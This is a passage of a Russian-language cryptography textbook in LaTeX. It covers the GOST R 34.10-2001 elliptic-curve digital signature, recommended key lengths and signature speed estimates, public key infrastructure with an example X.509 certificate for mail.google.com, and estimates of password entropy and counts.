        Выбирает группу, задавая либо случайные числа $0 < a, b < p-1$, либо инвариант $J(E)$:
        \[ J(E) = 1728 \frac{4 a^3}{4 a^3 + 27 b^2} \mod p. \]
        Если кривая задается инвариантом $J(E) \in \Z_p$, то он выбирается случайно в интервале $0 < J(E) < 1728$. Для нахождения $a,b$ вычисляется
        \[ K = \frac{J(E)}{1728 - J(E)}, \]
        \[ \begin{array}{l}
            a = 3 K \mod p, \\
            b = 2 K \mod p. \\
        \end{array} \]
    \item Пусть $m$ -- порядок группы точек эллиптической кривой $\E(\Z_p)$. ~Пользователь $A$ подбирает число $n$ и простое число $q$ такие, что
        \[ m = n q, ~ 2^{254} < q < 2^{256}, ~ n \geq 1, \]
        где $q$ -- делитель порядка группы.

        В циклической подгруппе порядка $q$ выбирается точка
        \[ P \in \E(\Z_p): ~ q P \equiv 0. \]
    \item Случайно выбирает число $d$ и вычисляет точку $Q = d P$.
    \item Формирует секретный и открытый ключи:
        \[ \SK = (d), ~ \PK = (p, E, q, P, Q). \]
\end{enumerate}

Теперь сторона $A$ создает свою цифровую подпись $S(M)$ сообщения $M$, выполняя следующие действия.
\begin{enumerate}
    \item Вычисляет число $\alpha = h(M)$, где $h$ -- криптографическая хэш-функция, определенная стандартом ГОСТ Р 34.11-94. В российском стандарте длина $h(M)$ равна 256 бит.
    \item Вычисляет  $e = \alpha \mod q$.
    \item Случайно выбирает число $k$ и вычисляет точку
        \[ C = k P = (x_c, y_c). \]
    \item Вычисляет  $r = x_c \mod q$.
	Если $r = 0$, то выбирает другое $k$.
    \item Вычисляет  $s = k e + r d \mod q$.
	Если $s = 0$, то выбирает другое $k$.
    \item Формирует подпись
        \[ S(M) = (r, s). \]
\end{enumerate}
Сторона $A$ передает стороне $B$ сообщение с подписью
    \[ (M, ~ S(M)). \]

Сторона $B$ проверяет подпись $(r,s)$, выполняя процедуру проверки подписи.
\begin{enumerate}
    \item Вычисляет  $\alpha = h(M)$ и $e = \alpha \mod q$.
    \item Вычисляет  $e^{-1} \mod q$.
    \item Проверяет условия $r < q, ~ r < s$. Если эти условия не выполняются, то подпись отвергается. Если условия выполняются, то процедура продолжается.
    \item Вычисляет числа
        \[ \begin{array}{l}
            a = s e^{-1} \mod q, \\
            b = -r e^{-1} \mod q. \\
        \end{array} \]
    \item Вычисляет точку
        \[ \tilde{C} = a P + b Q = (\tilde{x}_c, \tilde{y}_c). \]
        Если подпись верна, должны получить исходную точку $C$.
    \item Проверяет условие $\tilde{x}_{c} \mod q = r$. Если условие выполняется, то подпись принимается, в противном случае --- отвергается.
\end{enumerate}

Рассмотрим вычислительную сложность вскрытия подписи. Предположим, что криптоаналитик ставит своей задачей определение секретного ключа $d$. Как известно,  эта  задача является трудной. Для подтверждения этого можно привести следующий факт. Был поставлен следующий эксперимент: было выбрано число $p = 2^{97},$ и 1200 персональных компьютеров с тактовой частотой процессоров 200 МГц в 16 странах мира работали, чтобы решить эту задачу. Задача была решена за 53 дня круглосуточной работы. Если взять $p = 2^{256}$, то на решение такой задачи при наличии одного компьютера с частотой процессора 2 ГГц потребуется $10^{22}$ лет.



\section{Длины ключей}
\selectlanguage{russian}

В таблице~\ref{tab:recommended-key-lengths} приведены битовые длины ключей для криптосистем.
%Традиционные рекомендации основаны на аппроксимации существующих алгоритмов для взлома на 10-30 лет вперед.

\begin{table}[!ht]
    \centering
    \caption{Минимальные длины ключей в битах по стандартам России и США\label{tab:recommended-key-lengths}}
    \resizebox{\textwidth}{!}{ \begin{tabular}{|l|c|c|c|c|}
        \hline
        & \multirow{2}{*}{\parbox{1.5cm}{\medskip \centering Блочные шифры, $K$}} & \multicolumn{3}{|c|}{Схема ЭП} \\
        \cline{3-5}
        & & \parbox{1.5cm}{\centering RSA\index{криптосистема!RSA}, $n$} & \parbox{2.4cm}{\centering Эллипт. кривые, порядок точки} & \parbox{3.5cm}{\centering Эль-Гамаль\index{криптосистема!Эль-Гамаля} $\operatorname{mod} p$: модуль / порядок (под)группы} \\
        \hline \hline
        \multicolumn{5}{|c|}{Взломано} \\
        \hline
        Биты & 56 & 768 & 109 & 503  \\
        Конкурс & \textsc{DesChal} & RSA-768 & ECC2K-108 &  \\
        Год & 1997 & 2009 & 2000 &  \\
        \hline \hline
        \multicolumn{5}{|c|}{Стандарт России} \\
        \hline
        Биты & 256 &  & 255 & \\
        ГОСТ & 28147"---89 &~--- & 34.10-2001 &~--- \\
        Год & 1989 & & 2001 & \\
%       \hline
%       \multicolumn{2}{|l|}{\parbox{4cm}{Россия: нелицензируемая деятельность}} & \multicolumn{4}{c|}{40} \\
        \hline \hline
        \multicolumn{5}{|c|}{Стандарт США} \\
        \hline
        Биты & 128-256 & 1024-3072 & 151-480 & 1024-3072/160-256 \\
        FIPS \No & 197 & draft 186-3 & draft 186-3 & draft 186-3 \\
        Год & 2001 & 2006 & 2006 & 2006 \\
%       \hline
%       \multicolumn{2}{|l|}{\parbox{4cm}{США: экспортные ограничения до 2001 г.}} & 56 & 512 & 112 & 512/112 \\
%       \hline \hline
%       \multicolumn{2}{|l|}{Традиционные} & 80 & 1024 & 160 & 1024/160 \\
%       \cline{3-6}
%       \multicolumn{2}{|l|}{рекомендации} & 112 & 2048 & 224 & 2048/224 \\
%       \hline
%       \multicolumn{2}{|l|}{\parbox{4cm}{Рекомендация Lenstra, Verheul для 2010 г.}} & 78 & 1369 & 146-160 & 1369/138 \\
        \hline
    \end{tabular} }
\end{table}
%}\end{center}


\subsection*{Скорость вычисления ЭП}

Сравним производительность схем ЭП, чтобы продемонстрировать преимущества ЭП вида Эль-Гамаля\index{криптосистема!Эль-Гамаля} перед RSA\index{криптосистема!RSA} для больших ключей. В приложении показано, что в модульной арифметике по модулю числа $n$ с битовой длиной $k \simeq \log_2 n$ операции имеют битовую сложность:
\[ \begin{array}{lcl}
    a^b \mod n & - & O(k^3), \\
    ab \mod n, ~ a^{-1} \mod n & - & O(k^2), \\
    a+b \mod n & - & O(k). \\
\end{array} \]

Так как все описанные схемы ЭП используют возведение в степень по модулю, то битовая сложность~-- $O(k^3)$. Оценки количества целочисленных $t$-разрядных умножений при вычислении ЭП имеют вид:
\begin{enumerate}
    \item RSA\index{электронная подпись!RSA}:
        \[ (2 \log_2 n) \cdot \left( \frac{\log_2 n}{t} \right)^2; \]
    \item DSA\index{электронная подпись!DSA} (\langen{Digital Signature Algorithm}, стандарт США~\cite{FIPS-PUB-186-4})~-- электронная подпись, вычисляемая по принципу Эль-Гамаля\index{криптосистема!Эль-Гамаля} по модулю $p$ и с порядком циклической подгруппы $q$:
        \[ (2 \log_2 q) \cdot \left( \frac{\log_2 p}{t} \right)^2; \]
    \item ГОСТ Р 34.10-2001\index{электронная подпись!ГОСТ Р 34.10-2001} (стандарт России~\cite{GOST-2001}) и ECDSA\index{электронная подпись!ECDSA} (\langen{Elliptic Curve Digital Signature Algorithm}, стандарт США~\cite{FIPS-PUB-186-4}), вычисляемые по принципу Эль-Гамаля\index{криптосистема!Эль-Гамаля} в группе точек эллиптической кривой по модулю $p$:
        \[ (2 \log_2 p) \cdot 4 \cdot \left( \frac{\log_2 p}{t} \right)^2. \]
\end{enumerate}

В таблице~\ref{tab:signature-rate} приведены оценки скорости вычисления ЭП (оценки числа умножений 64-битовых слов).

\begin{table}[!ht]
    \centering
    \caption{Оценочное число 64-битовых умножений для вычисления ЭП\label{tab:signature-rate}}
    \begin{tabular}{|c|l|c|}
        \hline
        ЭП & Оценочное число 64-битовых умножений \\
        \hline \hline
        RSA\index{электронная подпись!RSA} 1024 & $(2 \cdot 1024) \cdot \left( \frac{1024}{64} \right)^2 \approx$ 500 000 \\
        RSA\index{электронная подпись!RSA} 2048 & 4 000 000 \\
        RSA\index{электронная подпись!RSA} 3072 & 14 000 000 \\
        RSA\index{электронная подпись!RSA} 4096 & 34 000 000 \\
        \hline \hline
        DSA\index{электронная подпись!DSA} 1024/160 & $(2 \cdot 160) \cdot \left( \frac{1024}{64} \right)^2 \approx$ 82 000 \\
        DSA\index{электронная подпись!DSA} 3072/256 & 1 200 000 \\
        \hline \hline
        ECDSA\index{электронная подпись!ECDSA} 160 & $(2 \cdot 160) \cdot 4 \cdot \left( \frac{160}{64} \right)^2 \approx$ 8 000 \\
        ECDSA\index{электронная подпись!ECDSA} 512 & 260 000 \\
        \hline \hline
        ГОСТ Р 34.10-2001\index{электронная подпись!ГОСТ Р 34.10-2001} & $(2 \cdot 256) \cdot 4 \cdot \left( \frac{256}{64} \right)^2 \approx$ 33 000 \\
        \hline
    \end{tabular}
\end{table}


\section{Инфраструктура открытых ключей}\label{chapter-public-key-infrastructure}

\subsection{Иерархия удостоверяющих центров}\label{section-CAs}
\selectlanguage{russian}

Проблему аутентификации и распределения сеансовых симметричных ключей шифрования в Интернете, а также в больших локальных и виртуальных сетях решают с помощью построения иерархии открытых ключей криптосистем с открытым ключом.

\begin{enumerate}
    \item Существует удостоверяющий центр (УЦ) верхнего уровня\index{удостоверяющий центр!верхнего уровня}, корневой УЦ\index{удостоверяющий центр!корневой} (root certificate authority, root CA), обладающий парой из закрытого и открытого ключей. Открытый ключ УЦ верхнего уровня распространяется среди всех пользователей, причем все пользователи \emph{доверяют УЦ}. Это означает, что:
        \begin{itemize}
            \item УЦ -- <<хороший>>, то есть обеспечивает надёжное хранение закрытого ключа, не пытается фальсифицировать и скомпрометировать свои ключи;
            \item имеющийся у пользователей открытый ключ УЦ действительно принадлежит УЦ.
        \end{itemize}
        В массовых информационных и интернет-системах открытые ключи многих корневых УЦ встроены в дистрибутивы и пакеты обновлений ПО. Доверие пользователей неявно проявляется в их уверенности в том, что открытые ключи корневых УЦ, включенные в ПО, не фальсифицированы и не скомпрометированы. \emph{Де-факто пользователи доверяют а) распространителям ПО и обновлений, б) корневому УЦ.}\index{доверие}

        Назначение УЦ верхнего уровня -- проверка принадлежности и подписание открытых ключей других удостоверяющих центров второго уровня, а также организаций и сервисов. УЦ подписывает своим закрытым ключом следующее сообщение:
        \begin{itemize}
            \item название и URI УЦ нижележащего уровня или организации/сервиса,
            \item значение сгенерированного открытого ключа и название алгоритма соответствующей криптосистемы с открытым ключом,
            \item время выдачи и срок действия открытого ключа.
        \end{itemize}

    \item УЦ второго уровня\index{удостоверяющий центр} (certificate authority, certification authority, CA) имеют свои пары открытых и закрытых ключей, сгенерированных и подписанных корневым УЦ. Причем перед подписанием корневой УЦ убеждается в <<надёжности>> УЦ второго уровня, производит юридические проверки. Корневой УЦ не имеет доступа к закрытым ключам УЦ второго уровня.

        Пользователи, имея в своей базе открытых ключей доверенные открытые ключи корневого УЦ, могут проверить ЭП открытых ключей УЦ 2-го уровня и убедиться, что предъявленный открытый ключ действительно принадлежит данному УЦ. Таким образом:
        \begin{itemize}
            \item Пользователи полностью доверяют корневому УЦ и его открытому ключу, который у них хранится. Пользователи верят, что корневой УЦ не подписывает небезопасные ключи и гарантирует, что подписанные им ключи действительно принадлежат УЦ 2-го уровня.
            \item Проверив ЭП открытого ключа УЦ 2-го уровня с помощью доверенного открытого ключа УЦ 1-го уровня, пользователь верит, что открытый ключ УЦ 2-го уровня действительно принадлежит данному УЦ и не был скомпрометирован.
        \end{itemize}

        Аутентификация в протоколе защищённого интернет-соединения SSL/TLS\index{протокол!SSL/TLS} достигается в результате проверки пользователями совпадения URI-адреса сервера из ЭП с фактическим адресом.

        УЦ второго уровня в свою очередь тоже подписывает открытые ключи УЦ третьего уровня, а также организаций. И так далее по уровням.

    \item В результате построена \emph{иерархия} подписанных открытых ключей.

    \item Открытый ключ с идентификационной информацией (название организации, URI-адрес веб-ресурса, дата выдачи, срок действия и др.) и подписью УЦ вышележащего уровня, заверяющей ключ и идентифицирующие реквизиты, называются \textbf{сертификатом открытого ключа},\index{сертификат открытого ключа} на который существует международный стандарт X.509\index{сертификат!X509}, последняя версия 3. В сертификате указывается его область применения: подписание других сертификатов, аутентификация для веба, аутентификация для электронной почты и т.~д.
\end{enumerate}

\begin{figure}[!ht]
	\centering
	\includegraphics[width=0.8\textwidth]{pic/X509-hierarchy}
	\caption{Иерархия сертификатов\label{fig:x509-hierarchy}}
\end{figure}

На рис.~\ref{fig:x509-hierarchy} приведены пример иерархии сертификатов и путь подписания сертификата X.509\index{сертификат!X509} интернет-сервиса Google Mail.

Система распределения, хранения и управления сертификатами открытых ключей называется \textbf{инфраструктурой открытых ключей}\index{инфраструктура открытых ключей} (public key infrastructure, PKI). PKI применяется для аутентификации в системах SSL/TLS\index{протокол!SSL/TLS}, IPsec\index{протокол!IPsec}, PGP и т.~д. Помимо процедур выдачи и распределения открытых ключей PKI также определяет процедуру отзыва скомпрометированных или устаревших сертификатов.


\subsection{Структура сертификата X.509}
\selectlanguage{russian}

Ниже приведён пример сертификата X.509\index{сертификат!X509} интернет-сервиса mail.google.com, использовавшийся для защищённого SSL-соединения в 2009 г. Сертификат напечатан командой \texttt{openssl x509 -in file.crt -noout -text}:

{\small \begin{verbatim}
Certificate:
Data:
  Version: 3 (0x2)
  Serial Number:
    6e:df:0d:94:99:fd:45:33:dd:12:97:fc:42:a9:3b:e1
  Signature Algorithm: sha1WithRSAEncryption
  Issuer: C=ZA, O=Thawte Consulting (Pty) Ltd.,
    CN=Thawte SGC CA
  Validity
    Not Before: Mar 25 16:49:29 2009 GMT
    Not After : Mar 25 16:49:29 2010 GMT
  Subject: C=US, ST=California, L=Mountain View, O=Google Inc,
    CN=mail.google.com
  Subject Public Key Info:
    Public Key Algorithm: rsaEncryption
    RSA Public Key: (1024 bit)
      Modulus (1024 bit):
        00:c5:d6:f8:92:fc:ca:f5:61:4b:06:41:49:e8:0a:
        2c:95:81:a2:18:ef:41:ec:35:bd:7a:58:12:5a:e7:
        6f:9e:a5:4d:dc:89:3a:bb:eb:02:9f:6b:73:61:6b:
        f0:ff:d8:68:79:1f:ba:7a:f9:c4:ae:bf:37:06:ba:
        3e:ea:ee:d2:74:35:b4:dd:cf:b1:57:c0:5f:35:1d:
        66:aa:87:fe:e0:de:07:2d:66:d7:73:af:fb:d3:6a:
        b7:8b:ef:09:0e:0c:c8:61:a9:03:ac:90:dd:98:b5:
        1c:9c:41:56:6c:01:7f:0b:ee:c3:bf:f3:91:05:1f:
        fb:a0:f5:cc:68:50:ad:2a:59
      Exponent: 65537 (0x10001)
  X509v3 extensions:
    X509v3 Extended Key Usage: TLS Web Server
      Authentication, TLS Web Client Authentication,
      Netscape Server Gated Crypto
    X509v3 CRL Distribution Points:
    URI:http://crl.thawte.com/ThawteSGCCA.crl
    Authority Information Access:
    OCSP - URI:http://ocsp.thawte.com
    CA Issuers - URI:http://www.thawte.com/repository/
        Thawte_SGC_CA.crt
    X509v3 Basic Constraints: critical
    CA:FALSE
Signature Algorithm: sha1WithRSAEncryption
  62:f1:f3:05:0e:bc:10:5e:49:7c:7a:ed:f8:7e:24:d2:f4:a9:
  86:bb:3b:83:7b:d1:9b:91:eb:ca:d9:8b:06:59:92:f6:bd:2b:
  49:b7:d6:d3:cb:2e:42:7a:99:d6:06:c7:b1:d4:63:52:52:7f:
  ac:39:e6:a8:b6:72:6d:e5:bf:70:21:2a:52:cb:a0:76:34:a5:
  e3:32:01:1b:d1:86:8e:78:eb:5e:3c:93:cf:03:07:22:76:78:
  6f:20:74:94:fe:aa:0e:d9:d5:3b:21:10:a7:65:71:f9:02:09:
  cd:ae:88:43:85:c8:82:58:70:30:ee:15:f3:3d:76:1e:2e:45:
  a6:bc
\end{verbatim}}

Как видно, сертификат действителен с 26.03.2009 до 25.03.2010, открытый ключ представляет собой ключ RSA\index{криптосистема!RSA} с длиной модуля $n =$ 1024 бит и экспонентой $e = 65537$ и принадлежит компании Google Inc. Открытый ключ предназначен для взаимной аутентификации веб-сервера mail.google.com и веб-клиента в протоколе SSL/TLS. Сертификат подписан ключом удостоверяющего центра Thawte SGC CA, подпись вычислена с помощью криптографического хэша SHA-1\index{хэш-функция!SHA-1} и алгоритма RSA\index{электронная подпись!RSA}. В свою очередь, сертификат с открытым ключом Thawte SGC CA для проверки значения ЭП данного сертификата расположен по адресу \url{http://www.thawte.com/repository/Thawte\_SGC\_CA.crt}.

Электронная подпись вычисляется от всех полей сертификата, кроме самого значения подписи.



\subimport*{protocols/}{index}

\subimport*{secret-sharing/}{index}

\subimport*{secure-systems-examples/}{index}

\chapter{Аутентификация пользователя}


\section{Многофакторная аутентификация}

Для защищённых приложений применяется \emph{многофакторная} аутентификация одновременно по факторам различной природы:
\begin{enumerate}
    \item Свойство, которым обладает субъект. Например: биометрия, природные уникальные отличия (лицо, радужная оболочка глаз, папиллярные узоры, последовательность ДНК).
    \item Знание -- информация, которую знает субъект. Например: пароль, PIN (Personal Identification Number).
    \item Владение -- вещь, которой обладает субъект. Например: электронная или магнитная карта, флэш-память.
%    \item Факторы присвоения. Например, номер машины, RFID-метка.
\end{enumerate}

В обычных массовых приложениях из-за удобства использования применяется аутентификация только по \emph{паролю}\index{пароль}, который является общим секретом пользователя и информационной системы. Биометрическая аутентификация по отпечаткам пальцев применяется существенно реже. Как правило, аутентификация по отпечаткам пальцев является дополнительным, а не вторым обязательным фактором (тоже из-за удобства её использования).

%Так же явно или неявно используется аутентификация по факторам:
%\begin{enumerate}
%    \item Социальная сеть. Доверие к индивидууму в личном или интернет общении, на основании общих связей.
%    \item Географическое положение. Например, для проверки оплаты товаров по кредитной карте.
%    \item Время. Доступ к сервисам или местам только в определённое время.
%    \item И др.
%\end{enumerate}


\section[Энтропия и криптостойкость паролей]{Энтропия и криптостойкость \protect\\ паролей}

Стандартный набор символов паролей, которые можно набрать на клавиатуре, используя английские буквы и небуквенные символы, состоит из $D=94$ символов. При длине пароля $L$ символов и предположении равновероятного использования символов энтропия паролей равна
    \[ H = L \log_2 D. \]

Клод Шеннон, исследуя энтропию символов английского текста, изучал вероятность успешного предсказания людьми следующего символа по первым нескольким символам слов или текста. В результате Шеннон получил оценку энтропии первого символа $s_1$ текста порядка $H(s_1) \approx 4{,}6$--$4{,}7$ бит/символ и оценки энтропий последующих символов, постепенно уменьшающиеся до $H(s_9) \approx 1{,}5$ бит/символ для 9-го символа. Энтропия для длинных текстов литературных произведений получила оценку $H(s_\infty) \approx 0{,}4$ бит/символ.

Статистические исследования баз паролей показывают, что наиболее часто используются буквы <<a>>, <<e>>, <<o>>, <<r>> и цифра <<1>>.

NIST (Национальный институт стандартов и технологий США, \langen{National Institute of Standards and Technology})  использует следующие рекомендации для оценки энтропии паролей\index{энтропия!пароля}, создаваемых людьми.
\begin{enumerate}
    \item Энтропия первого символа $H(s_1) = 4$ бит/символ.
    \item Энтропия со 2-го по 8-й символы $H(s_{i}) = 2$ бит/символ, $2 \leq i \leq 8$.
    \item Энтропия с 9-го по 20-й символы $H(s_{i}) = 1{,}5$ бит/символ, $9 \leq i \leq 20$.
    \item Энтропия с 21-го символа $H(s_{i}) = 1$ бит/символ, $i \geq 21$.
    \item Проверка композиции на использование символов разных регистров и небуквенных символов добавляет до 6-ти бит энтропии пароля.
    \item Словарная проверка на слова и часто используемые пароли добавляет до 6 бит энтропии для коротких паролей. Для 20-символьных и более длинных паролей прибавка к энтропии -- 0 бит.
\end{enumerate}

Для оценки энтропии пароля нужно сложить энтропии символов $H(s_i)$ и сделать дополнительные надбавки, если пароль удовлетворяет тестам на композицию и отсутствует в словаре.

\begin{table}[!ht]
    \caption{Оценка NIST предполагаемой энтропии паролей\label{tab:password-entropy}}
    \resizebox{\textwidth}{!}{ \begin{tabular}{|c||c|c|c||c|}
        \hline
        \multirow{2}{*}{\parbox{1.5cm}{\medskip \centering Длина пароля, символы}} & \multicolumn{3}{|c||}{\parbox{6cm}{\centering Энтропия паролей пользователей по критериям NIST}} & \multirow{2}{*}{\parbox{3cm}{\centering Энтропия случайных равновероятных паролей}} \\
        \cline{2-4}
        & \parbox{1.5cm}{\centering Без проверок} & \parbox{2cm}{\centering Словарная проверка} & \parbox{3cm}{\centering Словарная и композиционная проверка} & \\
        \hline
        4  & 10 & 14 & 16 & 26.3 \\
        6  & 14 & 20 & 23 & 39.5 \\
        8  & 18 & 24 & 30 & 52.7 \\
        10 & 21 & 26 & 32 & 65.9 \\
        12 & 24 & 28 & 34 & 79.0 \\
        16 & 30 & 32 & 38 & 105.4 \\
        20 & 36 & 36 & 42 & 131.7 \\
        24 & 40 & 40 & 46 & 158.0 \\
        30 & 46 & 46 & 52 & 197.2 \\
        40 & 56 & 56 & 62 & 263.4 \\
        \hline
    \end{tabular} }
\end{table}

В таблице~\ref{tab:password-entropy} приведена оценка NIST на величину энтропии пользовательских паролей в зависимости от их длины, и приведено сравнение с энтропией случайных паролей с равномерным распределением символов из набора в $D=94$ символов клавиатуры. Вероятное число попыток для подбора пароля составляет $O(2^H)$. Из таблицы видно, что по критериям NIST энтропия реальных паролей в 2--4 раза меньше энтропии случайных паролей с равномерным распределением символов.

\example
Оценим общее количество существующих паролей. Население Земли -- 7 млрд. Предположим, что всё население использует компьютеры и Интернет и у каждого человека по 10 паролей. Общее количество существующих паролей -- $7 \cdot 10^{10} \approx 2^{36}$.

Имея доступ к наиболее массовым интернет-сервисам с количеством пользователей десятки и сотни миллионов, в которых пароли часто хранятся в открытом виде из-за необходимости обновления ПО и, в частности, выполнения аутентификации, мы:
\begin{enumerate}
	\item имеем базу паролей, покрывающую существенную часть пользователей; 
	\item можем статистически построить правила генерирования паролей.
\end{enumerate}

Даже если пароль хранится в защищённом виде, то при вводе пароль, как правило, в открытом виде пересылается по Интернету, и все преобразования пароля для аутентификации осуществляет интернет-сервис, а не веб-браузер. Следовательно, интернет-сервис имеет доступ к исходному паролю.
\exampleend

В 2002 г. был подобран ключ для 64-битного блочного шифра RC5 сетью персональных компьютеров \texttt{distributed.net}, выполнявших вычисления в фоновом режиме. Суммарное время вычислений всех компьютеров -- 1757 дней, было проверено 83\% пространства всех ключей. Это означает, что пароли с оценочной энтропией менее 64 бит, то есть \emph{все пароли} до 40 символов по критериям NIST, могут быть подобраны в настоящее время. Конечно, с оговорками на то, что 1) нет ограничений на количество и частоту попыток аутентификаций, 2) алгоритм генерации вероятных паролей эффективен.

Строго говоря, использование даже 40-символьного пароля для аутентификации или в качестве ключа блочного шифрования является небезопасным.


\subsubsection{Число паролей}

Приведём различные оценки числа паролей, создаваемых людьми. Чаще всего такие пароли основаны на словах или закономерностях естественного языка. В английском языке всего около $1\ 000\ 000 \approx 2^{20}$ слов, включая термины.

%http://www.springerlink.com/content/bh216312577r6w64/fulltext.pdf
%http://www.antimoon.com/forum/2004/4797.htm

Используемые слоги английского языка имеют вид V, CV, VC, CVV, VCC, CVC, CCV, CVCC, CVCCC, CCVCC, CCCVCC, где C -- согласная (consonant), V -- гласная (vowel). 70\% слогов имеют структуру VC или CVC. Общее число слогов $S = 8000 \dots 12000$. Средняя длина слога -- 3 буквы.

Предполагая равновероятное распределение всех слогов английского языка, для числа паролей из $r$ слогов получим верхнюю оценку
    \[ N_1 = S^r = 2^{13 r} \approx 2^{4.3 L_1}. \]
Средняя длина паролей составит:
    \[ L_1 \approx 3 r. \]

Теперь предположим, что пароли могут состоять только из 2--3 буквенных слогов вида CV, VC, CVV, VCC, CVC, CCV с равновероятным распределением символов. Подсчитаем число паролей $N_2$, которые могут быть построены из $r$ таких слогов. В английском алфавите число гласных букв $n_v = 10$, согласных $n_c = 16$, $n = n_v + n_c = 26$. Верхняя оценка числа $r$-слоговых паролей:
    \[ N_2 = (n_c n_v + n_v n_c + n_c n_v n_v + n_v n_c n_c + n_c n_v n_c + n_c n_c n_v)^r \approx \]
        \[ \approx \left( n_c n_v(3 n_c + n_v) \right)^r, \]
    \[ N_2 \approx \left( \frac{n^3}{2} \right)^r \approx 2^{13 r} \approx 2^{4.3 L_2}. \]
Средняя длина паролей:
    \[ L_2 = \frac{n_c n_v(2 + 2 + 3 n_v + 3 n_c + 3 n_c + 3 n_c)}{n_c n_v (1 + 1 + n_v + n_c + n_c + n_c)} \cdot r \approx 3 r. \]

Как видно, в обоих предположениях получились одинаковые оценки для числа и длины паролей.

Подсчитаем верхние оценки числа паролей из $L$ символов, предполагая равномерное распределение символов из алфавита мощностью $D$ символов: a) $D_1 = 26$ строчных букв, б) все $D_2 = 94$ печатных символа клавиатуры (латиница и небуквенные символы):
    \[ N_3 = D_1^L \approx 2^{4.7 L}, \]
    \[ N_4 = D_2^L \approx 2^{6.6 L}. \]

\begin{table}[!ht]
    \caption{Различные верхние оценки числа паролей\label{tab:password-number}}
    \resizebox{\textwidth}{!}{ \begin{tabular}{|c||c|c|c|}
        \hline
        \multirow{2}{*}{\parbox{1.5cm}{\medskip\medspace \centering Длина пароля}} & \multicolumn{3}{|c|}{Число паролей} \\
        \cline{2-4}
            & \parbox{3.5cm}{\medspace \centering На основе слоговой композиции} &
            \parbox{3cm}{\medspace\centering Алфавит $D=26$ символов} &
            \parbox{3cm}{\medspace \centering Алфавит $D=94$ символа} \\
        \hline
        \rule{0pt}{2.5ex}$6$  & $2^{26}$ & $2^{28}$ & $2^{39}$ \\
        9  & $2^{39}$ & $2^{42}$ & $2^{59}$ \\
        12 & $2^{52}$ & $2^{56}$ & $2^{79}$ \\
        15 & $2^{65}$ & $2^{71}$ & $2^{98}$ \\
        \hline
        \rule{0pt}{2.5ex} 21 & $2^{91}$ & $2^{99}$ & $2^{137}$ \\
        \hline
        \rule{0pt}{2.5ex} 39 & $2^{169}$ & $2^{183}$ & $2^{256}$ \\
        \hline
    \end{tabular} }
\end{table}

Из таблицы~\ref{tab:password-number} видно, что при доступном объёме вычислений в $2^{60}$\,--\,$2^{70}$ операций, пароли вплоть до 15-ти символов, построенные на словах, слогах, изменениях слов, вставках цифр, небольшом изменении регистров и других простейших модификациях, в настоящее время могут быть найдены полным перебором как на вычислительном кластере, так и на персональном компьютере.

Для достижения криптостойкости паролей, сравнимой со 128- или 256-битовым секретным ключом, требуется выбирать пароль из 20 и 40 символов соответственно, что, как правило, не реализуется из-за сложности запоминания и возможных ошибок при вводе.


%Подсчитаем число паролей $N_1$, которые могут могут построены из $r$ ~ 2-3 буквенных слогов: $cv, vc, ccv, cvc, vcc$, где $c$ -- согласная, $v$ -- гласная. В английском алфавите $n_v = 10, n_c = 16, n = n_v + n_c = 26$. Число паролей
%    \[ N_1 = \left( n_v n_c (1 + 1 + n_c + n_c + n_c) \right)^r \approx 3^r n_v^r n_c^{2r}. \]
%Средняя длина паролей
%    \[ L = r \left( \frac{2 + 2 + 3 n_c + 3 n_c + 3 n_c}{1 + 1 + n_c + n_c + n_c} \right) \approx 3r. \]
%
%%Учтем, что $b \leq r$ символов могут быть заглавными: $N_1 \rightarrow N_2 < N_1 \binom{L}{b} \left( \frac{n}{n_v} \right)^b$. Вставим $d$ цифр в случайные места: $N_2 \rightarrow N_3 = N_2 (10 (1 + L))^d \approx N_2 (10 L)^d$.
%%
%%Общее число паролей
%%    \[ N = N_3 = 3^r 10^r 16^{2r} \binom{3r}{b} 2.6^b \left(10 \cdot 3 r \right)^d. \]
%%
%%\begin{table}[!ht]
%%    \centering
%%    \small
%%    \begin{tabular}{|c|c|c|c|c||cr|}
%%        \hline
%%        \parbox{1.3cm}{Слогов, $r$} & \parbox{1.8cm}{Заглавных букв, $b$} & \parbox{1.5cm}{Вставок цифр, $d$} & \parbox{2.8cm}{Средняя длина пароля, $L+d$} & \parbox{3cm}{Верхняя оценка числа паролей $N$} & \multicolumn{2}{|c|}{\parbox{3.2cm}{Число всех паролей}} \\
%%        \hline
%%        $2$ & $0$ & $0$ & $6$ & $2^{26}$ & $2^{36}$ & a-z \\
%%        $2$ & $2$ & $0$ & $6$ & $2^{32}$ & $2^{48}$ & A-Z, a-z \\
%%        $2$ & $2$ & $2$ & $8$ & $2^{45}$ & $2^{48}$ & A-Z, a-z, 0-9 \\
%%        \hline
%%        $3$ & $0$ & $0$ & $9$ & $2^{39}$ & $2^{54}$ & a-z \\
%%        $3$ & $3$ & $0$ & $9$ & $2^{49}$ & $2^{54}$ & A-Z, a-z \\
%%        $3$ & $3$ & $2$ & $11$ & $2^{63}$ & $2^{65}$ & A-Z, a-z, 0-9 \\
%%        \hline
%%        $4$ & $0$ & $0$ & $12$ & $2^{52}$ & $2^{93}$ & a-z \\
%%        $4$ & $3$ & $0$ & $12$ & $2^{64}$ & $2^{186}$ & A-Z, a-z \\
%%        $4$ & $3$ & $2$ & $14$ & $2^{78}$ & $2^{222}$ & A-Z, a-z, 0-9 \\
%%        \hline
%%    \end{tabular}
%%    \caption{Сравнение верхней оценки числа паролей, построенных на слогах, со всем доступным множеством паролей.}
%%    \label{tab:password-number}
%%\end{table}
%
%Учтем, что $b$ символов в пароле могут быть взяты не из 26-символьного алфавита строчных букв, а из всего алфавита в $D=94$ печатных символа клавиатуры (латиница и небуквенные символы):
%\[
%    \begin{array}{ll}
%    b=1 & N_1 \rightarrow N_2 = \frac{n_v}{n_v+n_c} 3^r n_v^{r-1} n_c^{2r} \cdot L. \]
%
%    \[ N_1 \rightarrow N_2 < N_1 \binom{L}{b} \left( \frac{D}{n_v} \right)^b. \]
%
%
%
%Общее число паролей
%    \[ N < 3^r n_v^r n_c^{2r} \binom{L}{b} \left( \frac{D}{n_v} \right)^b = 3^r 10^r 16^{2r} \binom{3r}{b} \left( \frac{94}{10} \right)^b. \]
%
%\begin{table}[!ht]
%    \centering
%    \small
%    \begin{tabular}{|c|c|c|c||cr|}
%        \hline
%        \parbox{1.5cm}{Слогов, $r$} & \parbox{3cm}{Средняя длина пароля, $L$} & \parbox{3cm}{Символов из всего алфавита, $b$} & \parbox{3cm}{Верхняя оценка числа паролей $N$} & \multicolumn{2}{|c|}{\parbox{3.2cm}{Число всех паролей, $D^L$}} \\
%        \hline
